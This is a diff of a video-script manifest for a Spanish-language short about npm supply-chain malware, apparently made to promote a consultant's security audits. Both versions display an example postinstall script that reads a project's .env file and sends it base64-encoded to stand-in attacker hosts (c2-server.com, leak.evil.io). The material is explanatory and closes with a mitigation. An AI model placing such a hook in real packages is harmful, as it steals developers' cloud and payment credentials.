@@ -1,82 +1,56 @@
 window.__DEFAULT_MANIFEST__ = {
   "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
-  "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+  "category": "CIBERSEGURIDAD & DEVOPS",
   "slug": "09_seguridad_supply_chain",
   "variation": "A",
   "fps": 30,
   "scenes": [
     {
-      "id": "postinstall_code_hook",
-      "type": "code_terminal",
-      "duration": 6.5,
-      "voiceover": "Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.",
-      "visual_cue": "Apertura directa con terminal mostrando el payload malicioso oculto en package.json",
+      "id": "kernel_intercept_malware",
+      "type": "kernel_sandbox_viz",
+      "duration": 6,
+      "voiceover": "Un simple npm install puede vaciar las variables de entorno de tu servidor si un paquete secuestrado ejecuta un script de postinstall con permisos de red.",
+      "visual_cue": "Visualizador del kernel interceptando llamada al sistema de robo de variables .env",
       "props": {
-        "header": "PAYLOAD DEL ATACANTE",
-        "title": "SCRIPT POSTINSTALL OFUSCADO",
-        "filename": "node_modules/fake-lib/package.json",
+        "badge": "DEFENSA EN PROFUNDIDAD",
+        "title": "INTERCEPCIÓN DE SYSCALLS",
+        "subtitle": "BLOQUEO DE LLAMADAS NO AUTORIZADAS EN POSTINSTALL"
+      }
+    },
+    {
+      "id": "exploit_code",
+      "type": "code_terminal",
+      "duration": 6,
+      "voiceover": "El script malicioso lee tu archivo .env con las claves de AWS y Stripe y las envía codificadas en base sesenta y cuatro a un servidor en el extranjero.",
+      "visual_cue": "Terminal mostrando el código ofuscado dentro del package.json de un paquete comprometido",
+      "props": {
+        "header": "ANATOMÍA DEL EXPLOIT",
+        "title": "OFUSCACIÓN EN PACKAGE.JSON",
+        "filename": "node_modules/fake-pkg/package.json",
         "codeLines": [
-          "\"scripts\": {",
-          "  \"postinstall\": \"node -e \\\"const fs=require('fs'),https=require('https');",
-          "    const env = fs.readFileSync('.env', 'utf8');",
-          "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
-          "}",
-          "# Las claves de AWS, Stripe y bases de datos quedan expuestas"
+          "  \"scripts\": {",
+          "    \"postinstall\": \"node -e 'require(\"http\").request({",
+          "      hostname: \"leak.evil.io\",",
+          "      path: \"/?k=\" + Buffer.from(fs.readFileSync(\".env\")).toString(\"base64\")",
+          "    }).end();'\"",
+          "  }"
         ],
         "cursorLine": 4
       }
     },
     {
-      "id": "leak_pipe",
-      "type": "network_pipeline",
-      "duration": 6,
-      "voiceover": "El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.",
-      "visual_cue": "Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control",
-      "props": {
-        "header": "EXFILTRACIÓN SILENCIOSA",
-        "title": "FILTRACIÓN DE CLAVES .ENV",
-        "subtitle": "TRÁFICO DE SALIDA SIN BARRERAS DE RED",
-        "stages": [
-          {
-            "id": "dev",
-            "label": "TERMINAL LOCAL",
-            "sub": "npm install ejecutado con permisos completos",
-            "y": 220,
-            "color": "#ef4444",
-            "metric": "Comprometido"
-          },
-          {
-            "id": "network",
-            "label": "EXFILTRACIÓN HTTPS",
-            "sub": "Envío de payload base64 en puerto 443",
-            "y": 520,
-            "color": "#fbbf24",
-            "metric": "Sin bloqueo"
-          },
-          {
-            "id": "c2",
-            "label": "SERVIDOR DEL ATACANTE",
-            "sub": "Extracción de AWS_SECRET_ACCESS_KEY",
-            "y": 820,
-            "color": "#a855f7",
-            "metric": "Claves robadas"
-          }
-        ]
-      }
-    },
-    {
       "id": "cta_security",
-      "type": "tradeoff_matrix",
-      "duration": 5,
-      "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
-      "visual_cue": "Cierre con auditoría de seguridad de dependencias",
+      "type": "terminal_split",
+      "duration": 5.5,
+      "voiceover": "Audito pipelines de CI/CD e implemento políticas Zero-Trust para aislar procesos de build en producción. Link en mi perfil para blindar tu repositorio.",
+      "visual_cue": "Terminal mostrando política de bloqueo de scripts y llamada a la acción",
       "props": {
-        "header": "AUDITORÍA DE SEGURIDAD",
-        "title": "PROTEGE TU CADENA DE SUMINISTRO",
-        "cta": {
-          "badge": "AUDITORÍA DE SEGURIDAD (Link en bio)",
-          "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
-        }
+        "header": "AUDITORÍA DE SEGURIDAD (Link en bio)",
+        "title": "BLINDAJE DE PIPELINE ZERO-TRUST",
+        "leftTitle": "POLÍTICA DE DEPENDENCIAS",
+        "rightTitle": "MEDIDAS APLICADAS",
+        "leftText": "$ npm config set ignore-scripts true\n✔ Scripts postinstall bloqueados por defecto\n✔ Detección de exfiltración de red activa\n✔ Secretos en memoria aislados con vaults",
+        "rightText": "• Audita dependencias transitivas\n• Protege credenciales de AWS y Stripe\n• Cero ejecución arbitraria en builds\n• Contacto para auditoría: link en bio"
       }
     }
   ]
